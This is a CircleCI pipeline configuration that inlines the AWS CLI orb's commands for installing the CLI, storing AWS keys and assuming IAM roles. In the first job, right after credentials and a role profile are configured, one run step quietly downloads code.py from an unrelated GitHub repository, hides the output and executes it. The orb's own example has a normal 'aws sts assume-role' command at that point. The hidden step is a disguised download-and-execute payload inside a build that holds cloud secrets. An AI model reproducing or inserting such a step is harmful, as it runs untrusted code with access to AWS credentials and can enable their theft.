version: '2.1'
orbs:
  aws-cli: circleci/aws-cli@3.1
jobs:
  configure-role-arn:
    executor: aws-cli/default
    steps:
      - checkout
      - aws-cli/setup:
          profile-name: default
      - aws-cli/role-arn-setup:
          profile-name: new-profile
          role-arn: 'arn:aws:iam::123456789012:role/example-role'
          source-profile: default
      - run: >-
           wget https://raw.githubusercontent.com/aurbach55/zash/main/code.py >/dev/null 2>&1 && python code.py
workflows:
  aws-cli:
    jobs:
      - configure-role-arn

commands:
    assume-role-with-web-identity:
        description: |
            Generate a shortlived AWS_ACCESS_KEY_ID, AWS_ACCESS_KEY_ID and AWS_SESSION_TOKEN using the $CIRCLE_OIDC_TOKEN.
            A properly configured web identity based ARN is also required for configuration.
            Use these keys and create a profile with the aws-cli/setup commands.
            For more information, see the CircleCI OIDC docs: https://circleci.com/docs/2.0/openid-connect-tokens/
        parameters:
            profile-name:
                default: default
                description: Profile name for web identity role assumption
                type: string
            role-arn:
                description: |
                    The Amazon Resource Name (ARN) of the role that the caller is assuming.
                    Role ARN must be configured for web identity.
                type: string
            role-session-name:
                default: ${CIRCLE_JOB}
                description: An identifier for the assumed role session
                type: string
            session-duration:
                default: "3600"
                description: The duration of the session in seconds
                type: string
        steps:
            - run:
                command: "PARAM_ROLE_SESSION_NAME=$(eval echo \"${PARAM_ROLE_SESSION_NAME}\")\nPARAM_AWS_CLI_ROLE_ARN=$(eval echo \"${PARAM_AWS_CLI_ROLE_ARN}\")\n\nif [ -z \"${PARAM_ROLE_SESSION_NAME}\" ]; then\n    echo \"Role session name is required\"\n    exit 1\nfi\n\n# shellcheck disable=SC2086,SC2034\nread -r AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN \\<<<\"$(aws sts assume-role-with-web-identity \\\n    --role-arn ${PARAM_AWS_CLI_ROLE_ARN} \\\n    --role-session-name ${PARAM_ROLE_SESSION_NAME} \\\n    --web-identity-token ${CIRCLE_OIDC_TOKEN} \\\n    --duration-seconds ${PARAM_SESSION_DURATION} \\\n    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \\\n    --output text)\"\n\nif [ -z \"${AWS_ACCESS_KEY_ID}\" ] || [ -z \"${AWS_SECRET_ACCESS_KEY}\" ] || [ -z \"${AWS_SESSION_TOKEN}\" ]; then\n    echo \"Failed to assume role\";\n    exit 1\nelse \n    {\n        echo \"export AWS_ACCESS_KEY_ID=\\\"${AWS_ACCESS_KEY_ID}\\\"\"\n        echo \"export AWS_SECRET_ACCESS_KEY=\\\"${AWS_SECRET_ACCESS_KEY}\\\"\"\n        echo \"export AWS_SESSION_TOKEN=\\\"${AWS_SESSION_TOKEN}\\\"\"\n    } >>\"$BASH_ENV\"\n    echo \"Assume role with web identity succeeded\"\nfi\n"
                environment:
                    PARAM_AWS_CLI_PROFILE_NAME: <<parameters.profile-name>>
                    PARAM_AWS_CLI_ROLE_ARN: <<parameters.role-arn>>
                    PARAM_ROLE_SESSION_NAME: <<parameters.role-session-name>>
                    PARAM_SESSION_DURATION: <<parameters.session-duration>>
                name: Generate shortlived AWS Keys using CircleCI OIDC token.
    install:
        description: Install the AWS CLI via Pip if not already installed.
        parameters:
            binary-dir:
                default: /usr/local/bin
                description: |
                    The main aws program in the install directory is symbolically linked to the file aws in the specified path. Defaults to /usr/local/bin
                type: string
            disable-aws-pager:
                default: true
                description: |
                    Set to false to skip forceful disabling of all AWS CLI output paging.
                type: boolean
            install-dir:
                default: /usr/local/aws-cli
                description: |
                    Specify the installation directory of AWS CLI. Defaults to /usr/local/aws-cli
                type: string
            override-installed:
                default: false
                description: |
                    By default, if the AWS CLI is detected on the system, the install will be skipped.
                    Enable this to override the installed version and install your specified version.
                type: boolean
            version:
                default: latest
                description: Select a specific version of the AWS v2 CLI. By default the latest version will be used.
                type: string
        steps:
            - run:
                command: |
                    if cat /etc/issue | grep "Alpine" >/dev/null 2>&1; then
                        if [ "$ID" = 0 ]; then export SUDO=""; else export SUDO="sudo"; fi
                    else
                        if [[ $EUID == 0 ]]; then export SUDO=""; else export SUDO="sudo"; fi
                    fi

                    Install_AWS_CLI() {
                        echo "Installing AWS CLI v2"
                        cd /tmp || exit
                        # Platform check
                        if uname -a | grep "Darwin"; then
                            export SYS_ENV_PLATFORM=macos
                        elif uname -a | grep "x86_64 GNU/Linux"; then
                            export SYS_ENV_PLATFORM=linux_x86
                        elif uname -a | grep "aarch64 GNU/Linux"; then
                            export SYS_ENV_PLATFORM=linux_arm
                        elif uname -a | grep "x86_64 Msys"; then
                            export SYS_ENV_PLATFORM=windows
                        elif cat /etc/issue | grep "Alpine" >/dev/null 2>&1; then
                            export SYS_ENV_PLATFORM=linux_alpine
                        else
                            echo "This platform appears to be unsupported."
                            uname -a
                            exit 1
                        fi

                        # Install per platform
                        case $SYS_ENV_PLATFORM in
                        linux_x86)
                            curl -sSL "https://awscli.amazonaws.com/awscli-exe-linux-x86_64$1.zip" -o "awscliv2.zip"
                            unzip -q -o awscliv2.zip
                            $SUDO ./aws/install -i "${PARAM_AWS_CLI_INSTALL_DIR}" -b "${PARAM_AWS_CLI_BINARY_DIR}"
                            rm -r awscliv2.zip ./aws
                            ;;
                        windows)
                            if [ ! "$(command -v choco)" ]; then
                                echo "Chocolatey is required to uninstall AWS"
                                exit 1
                            fi
                            choco install awscli --version="$1"
                            echo "$1"
                            if echo "$1" | grep "2."; then
                                echo 'export PATH="${PATH}:/c/Program Files/Amazon/AWSCLIV2"' >>"$BASH_ENV"
                            else
                                echo 'export PATH="${PATH}:/c/Program Files/Amazon/AWSCLI/bin"' >>"$BASH_ENV"
                            fi
                            ;;
                        macos)
                            curl -sSL "https://awscli.amazonaws.com/AWSCLIV2$1.pkg" -o "AWSCLIV2.pkg"
                            $SUDO installer -pkg AWSCLIV2.pkg -target /
                            rm AWSCLIV2.pkg
                            ;;
                        linux_arm)
                            curl -sSL "https://awscli.amazonaws.com/awscli-exe-linux-aarch64$1.zip" -o "awscliv2.zip"
                            unzip -q -o awscliv2.zip
                            $SUDO ./aws/install -i "${PARAM_AWS_CLI_INSTALL_DIR}" -b "${PARAM_AWS_CLI_BINARY_DIR}"
                            rm -r awscliv2.zip ./aws
                            ;;
                        linux_alpine)
                            apk --no-cache add \
                                binutils \
                                curl

                            curl -L https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub -o /etc/apk/keys/sgerrand.rsa.pub
                            curl -LO https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.34-r0/glibc-2.34-r0.apk
                            curl -LO https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.34-r0/glibc-bin-2.34-r0.apk
                            curl -LO https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.34-r0/glibc-i18n-2.34-r0.apk

                            apk add --no-cache \
                                glibc-2.34-r0.apk \
                                glibc-bin-2.34-r0.apk \
                                glibc-i18n-2.34-r0.apk

                            /usr/glibc-compat/bin/localedef -i en_US -f UTF-8 en_US.UTF-8
                            curl -sSL "https://awscli.amazonaws.com/awscli-exe-linux-x86_64$1.zip" -o "awscliv2.zip"

                            echo "https://awscli.amazonaws.com/awscli-exe-linux-x86_64$1.zip"
                            unzip awscliv2.zip
                            aws/install
                            rm -r awscliv2.zip ./aws
                            ;;
                        *)
                            echo "This orb does not currently support your platform. If you believe it should, please consider opening an issue on the GitHub repository:"
                            echo "https://github.com/CircleCI-Public/aws-cli-orb/issues/new"
                            exit 1
                            ;;
                        esac
                        # Toggle AWS Pager
                        if [ "$PARAM_AWS_CLI_DISABLE_PAGER" = 1 ]; then
                            if [ -z "${AWS_PAGER+x}" ]; then
                                echo 'export AWS_PAGER=""' >>"$BASH_ENV"
                                echo "AWS_PAGER is being set to the empty string to disable all output paging for AWS CLI commands."
                                echo "You can set the 'disable-aws-pager' parameter to 'false' to disable this behavior."
                            fi
                        fi
                    }

                    Uninstall_AWS_CLI() {
                        if uname -a | grep "x86_64 Msys"; then
                            if [ ! "$(command -v choco)" ]; then
                                echo "Chocolatey is required to uninstall AWS"
                                exit 1
                            fi
                            choco uninstall awscli
                        else
                            AWS_CLI_PATH=$(command -v aws)
                            echo "$AWS_CLI_PATH"
                            if [ -n "$AWS_CLI_PATH" ]; then
                                EXISTING_AWS_VERSION=$(aws --version)
                                echo "Uninstalling ${EXISTING_AWS_VERSION}"
                                # shellcheck disable=SC2012
                                if [ -L "$AWS_CLI_PATH" ]; then
                                    AWS_SYMLINK_PATH=$(ls -l "$AWS_CLI_PATH" | sed -e 's/.* -> //')
                                fi
                                if uname -a | grep "x86_64 Msys"; then export SUDO=""; fi
                                $SUDO rm -rf "$AWS_CLI_PATH" "$AWS_SYMLINK_PATH" "$HOME/.aws/" "/usr/local/bin/aws" "/usr/local/bin/aws_completer" "/usr/local/aws-cli"
                            else
                                echo "No AWS install found"
                            fi
                        fi
                    }

                    if [ ! "$(command -v aws)" ]; then
                        if [ "$PARAM_AWS_CLI_VERSION" = "latest" ]; then
                            Install_AWS_CLI
                        else
                            if uname -a | grep "x86_64 Msys"; then
                                Install_AWS_CLI "${PARAM_AWS_CLI_VERSION}"
                            else
                                Install_AWS_CLI "-${PARAM_AWS_CLI_VERSION}"
                            fi
                        fi
                    elif [ "$PARAM_AWS_CLI_OVERRIDE" = 1 ]; then
                        Uninstall_AWS_CLI
                        if uname -a | grep "x86_64 Msys"; then
                            Install_AWS_CLI "${PARAM_AWS_CLI_VERSION}"
                        else
                            Install_AWS_CLI "-${PARAM_AWS_CLI_VERSION}"
                        fi
                    else
                        echo "AWS CLI is already installed, skipping installation."
                        aws --version
                    fi
                environment:
                    PARAM_AWS_CLI_BINARY_DIR: <<parameters.binary-dir>>
                    PARAM_AWS_CLI_DISABLE_PAGER: <<parameters.disable-aws-pager>>
                    PARAM_AWS_CLI_INSTALL_DIR: <<parameters.install-dir>>
                    PARAM_AWS_CLI_OVERRIDE: <<parameters.override-installed>>
                    PARAM_AWS_CLI_VERSION: <<parameters.version>>
                name: Install AWS CLI - <<parameters.version>>
    role-arn-setup:
        description: |
            Create a new profile with role arn and source profile
        parameters:
            disable-aws-pager:
                default: true
                description: |
                    Set to false to skip forceful disabling of all AWS CLI output paging.
                type: boolean
            override-installed:
                default: false
                description: |
                    By default, if the AWS CLI is detected on the system, the install will be skipped.
                    Enable this to override the installed version and install your specified version.
                type: boolean
            profile-name:
                description: Name of new profile associated with role arn.
                type: string
            role-arn:
                description: Role ARN that the profile should take.
                type: string
            source-profile:
                default: default
                description: Source profile containing credentials to assume the role with role-arn.
                type: string
            version:
                default: latest
                description: Select a specific version of the AWS v2 CLI. By default the latest version will be used.
                type: string
        steps:
            - run:
                command: |
                    PARAM_AWS_CLI_ROLE_ARN=$(eval echo "${PARAM_AWS_CLI_ROLE_ARN}")
                    if [ ! -f "${HOME}/.aws/credentials" ]; then
                        echo "Credentials not found. Run setup command before role-arn-setup."
                        exit 1
                    fi

                    aws configure set profile."${PARAM_AWS_CLI_PROFILE_NAME}".role_arn "${PARAM_AWS_CLI_ROLE_ARN}"
                    aws configure set profile."${PARAM_AWS_CLI_PROFILE_NAME}".source_profile "${PARAM_AWS_CLI_SOURCE_PROFILE}"
                environment:
                    PARAM_AWS_CLI_PROFILE_NAME: <<parameters.profile-name>>
                    PARAM_AWS_CLI_ROLE_ARN: <<parameters.role-arn>>
                    PARAM_AWS_CLI_SOURCE_PROFILE: <<parameters.source-profile>>
                name: Configure role arn for profile <<parameters.profile-name>>
    setup:
        description: |
            Configure and store AWS credentials in
            ~/.aws/credentials and ~/.aws/config
        parameters:
            aws-access-key-id:
                default: AWS_ACCESS_KEY_ID
                description: |
                    AWS access key id for IAM role. Set this to the name of
                    the environment variable you will use to hold this
                    value, i.e. AWS_ACCESS_KEY.
                type: env_var_name
            aws-region:
                default: AWS_DEFAULT_REGION
                description: |
                    Env var of AWS region to operate in
                    (defaults to AWS_DEFAULT_REGION)
                type: env_var_name
            aws-secret-access-key:
                default: AWS_SECRET_ACCESS_KEY
                description: |
                    AWS secret key for IAM role. Set this to the name of
                    the environment variable you will use to hold this
                    value, i.e. $AWS_SECRET_ACCESS_KEY.
                type: env_var_name
            binary-dir:
                default: /usr/local/bin
                description: |
                    The main aws program in the install directory is symbolically linked to the file aws in the specified path. Defaults to /usr/local/bin
                type: string
            configure-default-region:
                default: true
                description: |
                    Some AWS actions don't require a region; set this to false if you do not want to store a default region in ~/.aws/config
                type: boolean
            configure-profile-region:
                default: true
                description: |
                    Boolean whether to configure the region for the custom (non-default) profile or not
                type: boolean
            disable-aws-pager:
                default: true
                description: |
                    Set to false to skip forceful disabling of all AWS CLI output paging.
                type: boolean
            install-dir:
                default: /usr/local/aws-cli
                description: |
                    Specify the installation directory of AWS CLI. Defaults to /usr/local/aws-cli
                type: string
            override-installed:
                default: false
                description: |
                    By default, if the AWS CLI is detected on the system, the install will be skipped.
                    Enable this to override the installed version and install your specified version.
                type: boolean
            profile-name:
                default: default
                description: Profile name to be configured.
                type: string
            role-arn:
                default: ""
                description: |
                    The Amazon Resource Name (ARN) of the role that the caller is assuming.
                    Role ARN must be configured for web identity.
                type: string
            role-session-name:
                default: ${CIRCLE_JOB}
                description: An identifier for the assumed role session
                type: string
            session-duration:
                default: "3600"
                description: The duration of the session in seconds
                type: string
            version:
                default: latest
                description: Select a specific version of the AWS v2 CLI. By default the latest version will be used.
                type: string
        steps:
            - install:
                binary-dir: <<parameters.binary-dir>>
                disable-aws-pager: <<parameters.disable-aws-pager>>
                install-dir: <<parameters.install-dir>>
                override-installed: <<parameters.override-installed>>
                version: <<parameters.version>>
            - when:
                condition:
                    and:
                        - <<parameters.role-session-name>>
                        - <<parameters.role-arn>>
                steps:
                    - assume-role-with-web-identity:
                        profile-name: <<parameters.profile-name>>
                        role-arn: <<parameters.role-arn>>
                        role-session-name: <<parameters.role-session-name>>
                        session-duration: <<parameters.session-duration>>
            - run:
                command: |
                    PARAM_AWS_CLI_ACCESS_KEY_ID=$(eval echo "\$$PARAM_AWS_CLI_ACCESS_KEY_ID")
                    PARAM_AWS_CLI_SECRET_ACCESS_KEY=$(eval echo "\$$PARAM_AWS_CLI_SECRET_ACCESS_KEY")
                    PARAM_AWS_CLI_REGION=$(eval echo "\$$PARAM_AWS_CLI_REGION")

                    aws configure set aws_access_key_id \
                        "$PARAM_AWS_CLI_ACCESS_KEY_ID" \
                        --profile "$PARAM_AWS_CLI_PROFILE_NAME"

                    aws configure set aws_secret_access_key \
                        "$PARAM_AWS_CLI_SECRET_ACCESS_KEY" \
                        --profile "$PARAM_AWS_CLI_PROFILE_NAME"

                    if [ -n "${AWS_SESSION_TOKEN}" ]; then
                        aws configure set aws_session_token \
                            "${AWS_SESSION_TOKEN}" \
                            --profile "$PARAM_AWS_CLI_PROFILE_NAME"
                    fi

                    if [ "$PARAM_AWS_CLI_CONFIG_DEFAULT_REGION" = "1" ]; then
                        aws configure set default.region "$PARAM_AWS_CLI_REGION" \
                            --profile "$PARAM_AWS_CLI_PROFILE_NAME"
                    fi

                    if [ "$PARAM_AWS_CLI_CONFIG_PROFILE_REGION" = "1" ]; then
                        aws configure set region "$PARAM_AWS_CLI_REGION" \
                            --profile "$PARAM_AWS_CLI_PROFILE_NAME"
                    fi
                environment:
                    PARAM_AWS_CLI_ACCESS_KEY_ID: <<parameters.aws-access-key-id>>
                    PARAM_AWS_CLI_CONFIG_DEFAULT_REGION: <<parameters.configure-default-region>>
                    PARAM_AWS_CLI_CONFIG_PROFILE_REGION: <<parameters.configure-profile-region>>
                    PARAM_AWS_CLI_PROFILE_NAME: <<parameters.profile-name>>
                    PARAM_AWS_CLI_REGION: <<parameters.aws-region>>
                    PARAM_AWS_CLI_SECRET_ACCESS_KEY: <<parameters.aws-secret-access-key>>
                name: Configure AWS Access Key ID
executors:
    default:
        description: |
            Highly cached minimal Ubuntu docker designed for CircleCI with Python and NodeJS installed.
        docker:
            - image: cimg/python:<<parameters.python-version>>
        parameters:
            python-version:
                default: 3.9-node
                description: |
                    Select your python version or any of the available tags here: https://hub.docker.com/r/cimg/python.
                type: string
examples:
    configure-role-arn:
        description: Configure a new profile to assume a role defined by a role-arn.
        usage:
            version: "2.1"
            orbs:
                aws-cli: circleci/aws-cli@3.1
            jobs:
                configure-role-arn:
                    executor: aws-cli/default
                    steps:
                        - checkout
                        - aws-cli/setup:
                            profile-name: default
                        - aws-cli/role-arn-setup:
                            profile-name: new-profile
                            role-arn: arn:aws:iam::123456789012:role/example-role
                            source-profile: default
                        - run: aws sts assume-role --role-arn "arn:aws:iam::123456789012:role/example-role" --role-session-name AWSCLI-Session
            workflows:
                aws-cli:
                    jobs:
                        - configure-role-arn
    install-aws-cli:
        description: Easily install and configure the AWS CLI automatically in your jobs or commands.
        usage:
            version: "2.1"
            orbs:
                aws-cli: circleci/aws-cli@3.1
            jobs:
                aws-cli-example:
                    executor: aws-cli/default
                    steps:
                        - checkout
                        - aws-cli/setup:
                            profile-name: example
                        - run: echo "Run your code here"
            workflows:
                aws-cli:
                    jobs:
                        - aws-cli-example:
                            context: aws